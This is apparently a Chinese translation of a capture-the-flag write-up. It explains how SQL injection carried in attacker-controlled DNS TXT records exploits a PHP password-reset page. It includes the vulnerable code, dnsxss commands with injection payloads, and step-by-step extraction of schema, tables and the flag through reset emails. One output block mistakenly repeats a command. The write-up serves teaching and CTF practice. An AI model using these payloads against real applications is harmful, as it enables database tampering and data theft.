# SQL Injection via DNS

原文：[https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-300-whatscat-sql-injection-via-dns](https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-300-whatscat-sql-injection-via-dns)

建议先看：[http://drops.wooyun.org/papers/3133](http://drops.wooyun.org/papers/3133)

0x00 分析
-------

* * *

Whatscat是一个可以上传猫咪的照片并且可以评论的php应用，地址：

https://blogdata.skullsecurity.org/whatscat.tar.bz2

漏洞代码存在于login.php的密码重置模块，如下：

```
elseif (isset($_POST["reset"])) {
    $q = mysql_query(sprintf("select username,email,id from users where username='%s'",
      mysql_real_escape_string($_POST["name"])));
    $res = mysql_fetch_object($q);
    $pwnew = "cat".bin2hex(openssl_random_pseudo_bytes(8));
    if ($res) {
      echo sprintf("<p>Don't worry %s, we're emailing you a new password at %s</p>",
        $res->username,$res->email);
      echo sprintf("<p>If you are not %s, we'll tell them something fishy is going on!</p>",
        $res->username);
$message = <<<CAT
Hello. Either you or someone pretending to be you attempted to reset your password.
Anyway, we set your new password to $pwnew

If it wasn't you who changed your password, we have logged their IP information as follows:
CAT;
      $details = gethostbyaddr($_SERVER['REMOTE_ADDR']).
        print_r(dns_get_record(gethostbyaddr($_SERVER['REMOTE_ADDR'])),true);
      mail($res->email,"whatscat password reset",$message.$details,"From: whatscat@whatscat.cat\r\n");
      mysql_query(sprintf("update users set password='%s', resetinfo='%s' where username='%s'",
              $pwnew,$details,$res->username));
    }
    else {
      echo "Hmm we don't seem to have anyone signed up by that name";
    }

```

注意如下代码：

```
  $details = gethostbyaddr($_SERVER['REMOTE_ADDR']).
    print_r(dns_get_record(gethostbyaddr($_SERVER['REMOTE_ADDR'])),true);
  mail($res->email,"whatscat password reset",$message.$details,"From: whatscat@whatscat.cat\r\n");
  mysql_query(sprintf("update users set password='%s', resetinfo='%s' where username='%s'",
          $pwnew,$details,$res->username));

```

$details变量未编码即插入数据库中。我注意到过去人们过于相信DNS查询返回的结果，这是这种误区的最好事例！如果我们能够在DNS请求中插入SQL语句，就万事大吉了！

在完成Whatscat挑战过程中，我点击forgot password，输入用户名：admin，然后它发送给我的一个Mailinator，一个邮件服务器。我登录这个邮箱，注意到有些人尝试通过TXT记录进行SQL注入，这些可能是其他用户留下的记录。

这个TXT记录实际上是用于便捷地控制所有SkullSpace ip地址的PTR记录，它能够做一些有用的事情而不是用来破坏！我用这个服务器做blog和一些在SkullSpace网络上的东西，然后我通过它设置了test.skullseclabs.org的PTR记录。实际上，如果你对206.220.196.59进行DNS解析，你会看见如下内容：

```
$ host blog.skullsecurity.org
blog.skullsecurity.org is an alias for skullsecurity.org.
skullsecurity.org has address 206.220.196.59
$ host 206.220.196.59
59.196.220.206.in-addr.arpa domain name pointer test.skullseclabs.org.

```

我为test.skullseclabs.org控制了授权服务器，所以我可以伪造任意记录。虽然对于这个级别来说是杀鸡用牛刀，但是至少我不用每次为了改变一条记录而翻到注册页面，并且我可以使用我写的一个叫做dnsxss的工具快速做到： https://github.com/iagox86/nbtool

```
$ sudo ./dnsxss --payload="Hello yes this is test"
Listening for requests on 0.0.0.0:53
Will response to queries with: Hello/yes/this/is/test

$ dig -t txt test123.skullseclabs.org
[...]
;; ANSWER SECTION:
test123.skullseclabs.org. 1     IN      TXT     "Hello yes this is test.test123.skullseclabs.org"

```

现在要做的就是找到合适的payload！

0x01 The exploit
----------------

* * *

我并不是盲注的fans，所以我在本地服务器搭了一个版本，打开SQL错误。然后我开始开发一个exploit！这是一条update语句，所以不能直接注入。我只能间接地通过将数据库内容返回在email上来读取。我也不知道如何适当地终止SQL语句(既不用#，也不用--，以及;)，最终我的payload将能够：

```
UPDATE其他的值到email字段上
恰当地读到最后，意味着用”resetinfo=”结束查询，所以”resetinfo=”字段会被余下部分填充。

```

最终payload如下：

```
./dnsxss --payload="test', email='test1234', resetinfo='"

```

我创建了一个账户，从我的ip重置密码，刷新。在测试服务器上完整的语句如下：

```
update users set password='catf7a252e008616c94', resetinfo='test.skullseclabs.orgArray ( [0] => Array ( [host] => test.skullseclabs.org [class] => IN [ttl] => 1 [type] => TXT [txt] => test', email='test1234', resetinfo='.test.skullseclabs.org [entries] => Array ( [0] => test', email='test1234', resetinfo=' ) ) ) ' where username='ron'

```

运行之后，重置密码内容如下：

```
Don't worry ron, we're emailing you a new password at test1234

If you are not ron, we'll tell them something fishy is going on!

```

已经成功重置了密码！

但是我想要的不是这个！

Mysql有一个非常便利的数据库叫做information_schema，可以通过它导出所有内容，修改payload如下：

```
./dnsxss --payload="test', email=(select group_concat(SCHEMA_NAME separator ', ') from information_schema.SCHEMATA), resetinfo='"

```

找回密码，刷新一下，收到如下邮件：

```
Don't worry ron, we're emailing you a new password at information_schema, mysql, performance_schema, whatscat

If you are not ron, we'll tell them something fishy is going on!

```

得到whatscat的所有表名：

```
./dnsxss --payload="test', email=(select group_concat(TABLE_NAME separator ', ') from information_schema.TABLES where TABLE_SCHEMA='whatscat'), resetinfo='"

```

收到邮件：

```
./dnsxss --payload="test', email=(select group_concat(TABLE_NAME separator ', ') from information_schema.TABLES where TABLE_SCHEMA='whatscat'), resetinfo='"

```

得到flag表的所有列名：

```
./dnsxss --payload="test', email=(select group_concat(COLUMN_NAME separator ', ') from information_schema.COLUMNS where TABLE_NAME='flag'), resetinfo='"

```

收到邮件：

```
Don't worry ron, we're emailing you a new password at flag

If you are not ron, we'll tell them something fishy is going on!

```

最后取出列中的内容：

```
./dnsxss --payload="test', email=(select group_concat(flag separator ', ') from whatscat.flag), resetinfo='"

```

得到flag：

```
Don't worry ron, we're emailing you a new password at 20billion_d0llar_1d3a

If you are not ron, we'll tell them something fishy is going on!

```

0x02 总结
-------

* * *

这篇paper的重点是通过伪造了PTR的记录类型，将DNS查询的TXT记录定向到自己控制的dns服务器，从而控制了DNS插叙返回的内容，而人们往往是无条件信任DNS查询返回的内容。